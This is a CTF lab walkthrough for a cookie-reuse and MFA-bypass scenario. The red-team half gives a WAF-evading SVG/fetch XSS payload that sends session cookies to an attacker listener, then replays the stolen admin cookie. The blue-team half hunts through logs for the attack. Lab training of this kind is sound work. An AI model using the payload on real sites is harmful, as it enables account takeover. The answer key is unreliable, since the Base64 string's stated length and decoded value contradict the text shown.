# 📖 LAB WALKTHROUGH: SCENARIO 75 (COOKIES REUSE & MFA BYPASS)

This guide contains the step-by-step solution for the CTF challenge, both from the attacker’s perspective (Red Team) and the forensic analyst’s perspective (Blue Team).

---

# 🔴 PART 1: RED TEAM WALKTHROUGH (ATTACK PATH)

## Phase 1: Reconnaissance (Information Gathering)

### Backend Technology Identification

Perform banner-grabbing against the target server to inspect the HTTP header information:

```bash id="5nj7bw"
curl -I http://192.168.1.8:3075/
```
<img width="711" height="177" alt="image" src="https://github.com/user-attachments/assets/abf4ab9a-8cb5-476b-8d84-64476a0faa1f" />

### Finding

The response header contains:

```http id="zlsf9w"
X-Powered-By: Node.js
```

🎯 Flag Revealed:

```text id="m84g1m"
SCENARIO75{Node.js}
```

---

## Source Code Analysis & Hidden Path Discovery

Open the main page:

```text id="1o1q0v"
http://192.168.1.8:3075/
```
<img width="843" height="220" alt="image" src="https://github.com/user-attachments/assets/c20c1d30-47a3-476c-923f-15af5eb6556b" />

Using a browser:

* Right Click → View Page Source

Inside the HTML code, an ASCII Art comment instructs the user to inspect the `robots.txt` file.

🎯 Flag Revealed:

```text id="m0r27h"
SCENARIO75{robots.txt}
```

Access:

```text id="iq5f6z"
http://192.168.1.8:3075/robots.txt
```
<img width="843" height="220" alt="image" src="https://github.com/user-attachments/assets/a98a70d1-5bc3-435a-8713-89a1f98cc51a" />

The file disallows crawling sensitive endpoints.

🎯 Flag Revealed:

```text id="9w2k7v"
SCENARIO75{/api/verify-mfa}
```

---

## Admin Route Hint

Based on common web application structures, the attacker guesses the administrative area is located at:

```text id="wlw30v"
/dashboard
```
<img width="824" height="492" alt="image" src="https://github.com/user-attachments/assets/169c9f1a-786e-4c7e-9001-20b9f0440e54" />

🎯 Flag Revealed:

```text id="t9x6o4"
SCENARIO75{/dashboard}
```

---

## Initial Session Analysis

Open:

* Developer Tools (F12)
* Application / Storage Tab
* Cookies

The system automatically issues a pre-authentication cookie when a user first visits the application.

<img width="879" height="407" alt="image" src="https://github.com/user-attachments/assets/2c00cf23-72e3-4902-8596-e6f053fa501b" />

🎯 Cookie Name Flag:

```text id="b4bnz8"
SCENARIO75{pre_mfa_session}
```

🎯 Cookie Value Flag:

```text id="b67vnn"
SCENARIO75{pending_mfa_verification}
```

---

# Phase 2: Defense Evasion (WAF Bypass & Cookie Exfiltration)

## Form Logic Analysis

Inspect the `<form>` tag on the main page.
The feedback input must be submitted using a specific HTTP method.

<img width="758" height="89" alt="image" src="https://github.com/user-attachments/assets/c28f55e0-c358-4459-8993-de776e823093" />

🎯 Flag Revealed:

```text id="lvjlwm"
SCENARIO75{POST}
```

---

## WAF Filter Testing

Inject a standard Cross-Site Scripting (XSS) payload into the feedback form:

```html id="4n1j0s"
<script>alert(1)</script>
```

### Result

<img width="758" height="239" alt="image" src="https://github.com/user-attachments/assets/e3059a2c-5ef4-47ec-9716-6d8074e30669" />

The application blocks the request and returns:

```http id="13umgu"
403 Forbidden
```

🎯 Flag Revealed:

```text id="u7e4zw"
SCENARIO75{403}
```

---

## WAF Escalation & Bypass

The WAF detects:

* `script`
* `document.cookie`

To bypass the filter, the attacker uses:

* Alternative HTML5 tags (`<svg>`)
* JavaScript string concatenation
* Bracket notation obfuscation

🎯 Bypass Tag Flag:

```text id="1wn5iy"
SCENARIO75{<svg>}
```

🎯 JavaScript Obfuscation Flag:

```text id="dd97oz"
SCENARIO75{window['docu'+'ment']['coo'+'kie']}
```

---

## Cookie Data Exfiltration

Because the cookie `HttpOnly` property is configured insecurely by the developer, external JavaScript is capable of reading the session cookie.

<img width="1144" height="200" alt="image" src="https://github.com/user-attachments/assets/9ed0cef1-212f-41bb-af6e-51805046b8a8" />

🎯 Cookie Vulnerability Flag:

```text id="0d7vqj"
SCENARIO75{False}
```

The attacker launches a Python HTTP Server on their laptop (port 8000) as a listener, then submits the following bypass payload using the Fetch API:

<img width="809" height="77" alt="image" src="https://github.com/user-attachments/assets/0d6fffff-6cb7-467b-9b01-ccefeb141640" />

```html id="7q7cyk"
<svg onload="fetch('http://<ATTACKER_IP>:8000/?c='+window['docu'+'ment']['coo'+'kie'])">
```


🎯 Transfer Mechanism Flag:

```text id="uy5oyt"
SCENARIO75{fetch}
```

---

# Phase 3: Initial Access & MFA Bypass (Main Exploitation)

## MFA Bypass

When the Administrator opens the dashboard, the XSS payload executes and transmits the administrator session cookie — which uses a special prefix — back to the attacker’s machine.

<img width="809" height="122" alt="image" src="https://github.com/user-attachments/assets/96015ec4-d732-46c5-9638-0338d5be59ea" />

🎯 Session Prefix Flag:

```text id="k5ehx7"
SCENARIO75{adm_sess}
```

---

## Session Replay

The attacker injects the stolen cookie:

```text id="1yq28j"
admin_session=adm_sess_...
```

Into their own browser and accesses:

```text id="6xd6sv"
/dashboard
```

Because of flawed server-side session validation logic, the system immediately grants administrator access and skips the MFA gateway endpoint.

<img width="1920" height="575" alt="image" src="https://github.com/user-attachments/assets/9444bef7-a75b-477e-bfd0-fa5ccfdb33a8" />

🎯 MFA Bypass Endpoint Flag:

```text id="s8hxwj"
SCENARIO75{/api/verify-mfa}
```

---

## Execution Visualization

Inside the administrator dashboard, the stored XSS payload is rendered inside a dedicated CSS container class.

<img width="1033" height="145" alt="image" src="https://github.com/user-attachments/assets/94dcf973-1831-4d3b-9b5c-130daeee88fe" />

🎯 CSS Container Flag:

```text id="5wry5j"
SCENARIO75{xss-payload}
```

---

# 🏆 MAIN RED TEAM FLAG

```text id="t4sn5d"
SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

---

# 🔵 PART 2: BLUE TEAM WALKTHROUGH (INCIDENT RESPONSE & LOG FORENSICS)

The Blue Team analyst performs the investigation by connecting through the custom SSH service (Port 2275) using the credentials:

| Username | Password        |
| -------- | --------------- |
| analyst  | blue_team_rocks |

---

# Phase 1: Log Scoping & Footprint Extraction

## Investigation Location

The analyst inspects the default web server log directory to search for attacker traces.

```bash id="h1vb0f"
cd /opt/admin/logs
```

<img width="811" height="101" alt="image" src="https://github.com/user-attachments/assets/73ec3a71-2695-45c7-bc08-0e13ee3a47a1" />

🎯 Log Location Flag:

```text id="3mgv4m"
SCENARIO75{/opt/admin/logs}
```

---

## Attacker Profile Analysis

Inspect `access.log` for suspicious activity outside the internal network:

```bash id="6zvhux"
cat access.log | grep "robots.txt"
```

### Finding

A suspicious external IP address appears using a default penetration-testing Linux user-agent.

<img width="811" height="86" alt="image" src="https://github.com/user-attachments/assets/b3e1105d-4824-4691-9661-40e54730ddd2" />

🎯 Attacker IP Flag:

```text id="t7bqrf"
SCENARIO75{10.10.14.50}
```

🎯 User-Agent Flag:

```text id="84y2gv"
SCENARIO75{Mozilla/5.0}
```

---

## Dashboard Intrusion Analysis

Search for successful `200 OK` access events to the sensitive `/dashboard` endpoint:

```bash id="xtquz6"
cat access.log | grep "10.10.14.50" | grep "dashboard"
```

<img width="811" height="114" alt="image" src="https://github.com/user-attachments/assets/e0f1aa42-5e36-488e-a9c8-fd13c6b32528" />

🎯 Status Code Flag:

```text id="4a5c9z"
SCENARIO75{200}
```

🎯 Exact Timestamp Flag:

```text id="5j4h8h"
SCENARIO75{18:51:55}
```

---

## Exfiltrated Data Identification

Inside the access log entry, a long mysterious string appears in the `X-Forwarded-For` header.

<img width="800" height="77" alt="image" src="https://github.com/user-attachments/assets/b19ef458-70da-41df-b05d-8436fdcbb9c6" />

🎯 Base64 String Flag:

```text id="whu76d"
SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}
```

---

# Phase 2: Threat Hunting (Attack Pattern Mapping)

## Legitimate Traffic Separation

The analyst maps the logs to separate legitimate administrator traffic from malicious attacker traffic.

<img width="811" height="422" alt="image" src="https://github.com/user-attachments/assets/bbff0850-e24c-45f6-be95-0e68da66497d" />

🎯 Legitimate IP Flag:

```text id="m0e6zy"
SCENARIO75{192.168.1.100}
```

🎯 Attacker Subnet Flag:

```text id="abdx4h"
SCENARIO75{10.10.14.0/24}
```

---

## Defensive Alert Investigation

The analyst opens the error log to identify when the WAF first detected and blocked the XSS payload.

```bash id="pnh7m7"
cat error.log | grep "WAF BLOCK"
```
<img width="800" height="77" alt="image" src="https://github.com/user-attachments/assets/e7cd8417-c9b9-4a99-8ef6-96a7e8c18568" />

🎯 Error Log Location Flag:

```text id="xgzwfa"
SCENARIO75{/opt/admin/logs/error.log}
```

🎯 Blocked Character Flag:

```text id="9wl7ma"
SCENARIO75{<script>}
```

🎯 Block Timestamp Flag:

```text id="jlwm2r"
SCENARIO75{18:50:15}
```

---

## MFA Compliance Validation

The analyst verifies whether the attacker IP (`10.10.14.50`) ever completed MFA verification before accessing the dashboard.

### Result

No record exists.

🎯 Verification Endpoint Flag:

```text id="35epf8"
SCENARIO75{No}
```

---

# Phase 3: Root Cause Analysis & Decoding

## Header Characteristic Analysis

The suspicious string discovered in Phase 1 is analyzed as a binary-to-text encoding representation with a precise length of 44 characters.

🎯 Encoding Method Flag:

```text id="fj6yys"
SCENARIO75{Base64}
```

🎯 Character Length Flag:

```text id="rz3xmh"
SCENARIO75{44}
```

---

## Severity Classification

The cookie reuse / session hijacking event is categorized by the logging system as the highest threat severity.

🎯 Severity Flag:

```text id="0ejv2p"
SCENARIO75{CRITICAL}
```

---

## Warning String Investigation

At timestamp `18:53:10`, the internal logs record a token mismatch anomaly.

```bash id="5sh6fr"
cat error.log | grep "18:53:10"
```

<img width="800" height="98" alt="image" src="https://github.com/user-attachments/assets/c8e839fe-6598-4358-97b4-733dad9d1062" />

🎯 Anomaly Timestamp Flag:

```text id="4mjlwm"
SCENARIO75{18:53:10}
```

🎯 Warning Message Flag:

```text id="zebqcc"
SCENARIO75{Authentication bypass anomaly}
```

---

## Case Resolution (Decoding the Flag)

The analyst decodes the Base64 string discovered in the network header to recover the final forensic evidence.

```bash id="1fq5h9"
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
```

<img width="811" height="72" alt="image" src="https://github.com/user-attachments/assets/449134ef-e222-4f23-a870-0b2727a854ab" />

---

# 🏆 MAIN BLUE TEAM FLAG

```text id="6p03e6"
SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}
```
